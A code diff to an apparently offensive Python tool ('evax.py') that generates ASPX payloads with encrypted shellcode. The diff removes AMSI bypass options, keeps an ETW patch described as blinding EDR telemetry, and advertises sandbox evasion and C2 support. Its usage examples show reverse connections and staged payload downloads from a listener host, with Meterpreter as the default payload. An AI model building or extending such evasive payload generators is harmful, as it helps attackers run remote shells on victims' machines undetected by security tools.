@@ -93,11 +93,10 @@ BANNER = f"""
     ╚══════════════════════════════════════════════════════════╝\033[0m
 
 \033[1;32m    [+] Features:\033[0m
-        • Multi-layer encryption (Caesar/XOR/AES-256/RC4)
+        • Multi-layer encryption (Caesar/XOR/XOR-Multi/RC4)
         • Sandbox evasion (VirtualAllocExNuma, Sleep, Resources)
-        • AMSI & ETW bypass integration
+        • ETW patching (blind EDR telemetry)
         • Polymorphic code generation
-        • Direct syscalls support
         • Multiple C2 frameworks support
 """
 
@@ -497,9 +496,6 @@ class AspxGenerator:
             code += "\n" + EvasionEngine.get_sandbox_check_username()
             code += "\n" + EvasionEngine.get_sandbox_check_files()
         
-        if self.config.get('amsi_bypass'):
-            code += "\n" + EvasionEngine.get_amsi_bypass()
-        
         if self.config.get('etw_patch'):
             code += "\n" + EvasionEngine.get_etw_patch()
         
@@ -761,10 +757,10 @@ Examples:
     python3 evax.py -i 192.168.1.100 -p 443
     
   Maximum evasion:
-    python3 evax.py -i 192.168.1.100 -p 443 --evasion max
+    python3 evax.py -i 192.168.1.100 -p 443 --evasion max --etw
     
-  AES encryption with AMSI bypass:
-    python3 evax.py -i 192.168.1.100 -p 443 -e rc4 --amsi --etw
+  RC4 encryption with ETW patch:
+    python3 evax.py -i 192.168.1.100 -p 443 -e rc4 --etw
     
   Staged payload:
     python3 evax.py -i 192.168.1.100 -p 443 --staged --url http://192.168.1.100/s.bin
@@ -789,8 +785,7 @@ Examples:
     # Evasion options
     parser.add_argument("--evasion", choices=['low', 'medium', 'max'], default='medium',
                         help="Evasion level (default: medium)")
-    parser.add_argument("--amsi", action="store_true", help="Include AMSI bypass")
-    parser.add_argument("--etw", action="store_true", help="Include ETW patch")
+    parser.add_argument("--etw", action="store_true", help="Include ETW patch (recommended for EDR bypass)")
     
     # Payload options
     parser.add_argument("--payload", default='meterpreter_https',
@@ -812,7 +807,6 @@ Examples:
     # Configuration
     config = {
         'evasion_level': args.evasion,
-        'amsi_bypass': args.amsi,
         'etw_patch': args.etw,
         'sleep_evasion': args.evasion in ['medium', 'max'],
     }
@@ -838,8 +832,6 @@ Examples:
         
         print_status(f"Encryption: {args.encryption}")
         print_status(f"Evasion level: {args.evasion}")
-        if args.amsi:
-            print_status("AMSI bypass: Enabled")
         if args.etw:
             print_status("ETW patch: Enabled")
         
